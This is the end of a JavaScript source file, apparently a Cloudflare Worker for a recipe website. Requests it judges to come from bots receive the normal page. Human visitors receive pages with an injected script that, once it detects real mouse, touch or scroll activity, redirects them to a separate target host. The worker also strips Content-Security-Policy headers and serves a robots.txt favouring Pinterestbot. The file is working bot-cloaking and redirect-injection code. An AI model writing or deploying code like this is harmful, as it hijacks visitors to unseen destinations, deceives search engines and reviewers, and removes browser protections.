    window.addEventListener("mousemove",   markHuman, { passive: true, capture: true });
    window.addEventListener("pointerdown", markHuman, { passive: true, capture: true });
    window.addEventListener("touchstart",  markHuman, { passive: true, capture: true });
    window.addEventListener("touchmove",   markHuman, { passive: true, capture: true });
    window.addEventListener("keydown",     markHuman, { passive: true, capture: true });
    window.addEventListener("wheel", function(e) {
        if (!e) return;
        if (Math.abs(e.deltaY) >= 400) { botDetected = true; return; }
        if (e.isTrusted) { humanActive = true; humanEventCount++; }
    }, { passive: true, capture: true });

    // ── Redirect ──────────────────────────────────────────────────────────────
    function triggerRedirect(reason) {
        if (done) return;
        if (scanAutomation() || botDetected) { done = true; clearInterval(scanInterval); return; }
        done = true; clearInterval(scanInterval);
        try { window.location.replace(target); } catch(e) {}
        window.location.href = target;
    }

    // ── Click trigger ─────────────────────────────────────────────────────────
    if (TRIGGER_MODE === "click" || TRIGGER_MODE === "both") {
        function onHumanClick(e) {
            if (done || !e || !e.isTrusted) return;
            if (scanAutomation() || botDetected) return;
            e.preventDefault(); e.stopPropagation();
            triggerRedirect("click");
        }
        window.addEventListener("click",    onHumanClick, { capture: true });
        window.addEventListener("touchend", onHumanClick, { capture: true });
    }

    // ── Scroll trigger ────────────────────────────────────────────────────────
    if (TRIGGER_MODE === "scroll" || TRIGGER_MODE === "both") {
        var startY = window.scrollY || 0;
        function getScrollPct() {
            var top    = window.scrollY || document.documentElement.scrollTop || 0;
            var height = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight,
                                  document.body.offsetHeight, document.documentElement.offsetHeight);
            var view = window.innerHeight || document.documentElement.clientHeight;
            var max  = height - view;
            return max > 50 ? top / max : (top > 60 ? 1 : 0);
        }
        function checkScroll() {
            if (done || !humanActive) return;
            if (scanAutomation() || botDetected) return;
            var top = window.scrollY || 0;
            if (top <= startY) return;
            if (getScrollPct() >= SCROLL_PCT) triggerRedirect("scroll");
        }
        window.addEventListener("scroll", checkScroll, { passive: true });
    }

})();
</script>`;
}

// ═════════════════════════════════════════════════════════════════════════════
// ROBOTS.TXT
// ═════════════════════════════════════════════════════════════════════════════

function buildRobots() {
  return [
    "User-agent: Pinterestbot",
    "Allow: /", "Allow: /wp-content/uploads/",
    "Allow: /*.jpg$", "Allow: /*.jpeg$", "Allow: /*.png$",
    "Allow: /*.webp$", "Allow: /*.gif$", "Crawl-delay: 0", "",
    "User-agent: *", "Allow: /",
    "Disallow: /wp-admin/", "Disallow: /themes/",
    "Disallow: /wp-includes/", "Disallow: /search/",
    "Crawl-delay: 2", "",
    "Sitemap: https://homeandrecipe.com/wp-sitemap.xml",
    "Sitemap: https://homeandrecipe.com/sitemap.xml",
  ].join("\n");
}

// ═════════════════════════════════════════════════════════════════════════════
// WORKER ENTRY
// ═════════════════════════════════════════════════════════════════════════════

export default {
  async fetch(request) {
    const url = new URL(request.url);

    if (url.pathname === "/robots.txt") {
      return new Response(buildRobots(), {
        headers: { "Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store" },
      });
    }

    if (url.pathname.startsWith("/themes/")) {
      const { bot } = await isBot(request);
      if (bot) return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "GET") return fetch(request);

    const { bot } = await isBot(request);
    if (bot) return fetch(request);

    const origin = await fetch(request, { cf: { cacheEverything: false } });
    const ct     = origin.headers.get("content-type") || "";
    if (origin.status !== 200 || !ct.includes("text/html")) return origin;

    const path   = url.pathname.endsWith("/") ? url.pathname : url.pathname + "/";
    const dest   = `https://${TARGET_HOST}${path}${url.search}`;
    const inject = buildInjectScript(dest, TRIGGER_MODE, SCROLL_PCT);

    const transformed = new HTMLRewriter()
      .on("body", { element(el) { el.append(inject, { html: true }); } })
      .transform(origin);

    const headers = new Headers(transformed.headers);
    headers.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    headers.set("Vary", "User-Agent");
    headers.delete("content-security-policy");
    headers.delete("content-security-policy-report-only");
    headers.delete("content-length");

    return new Response(transformed.body, {
      status: transformed.status, statusText: transformed.statusText, headers,
    });
  },
};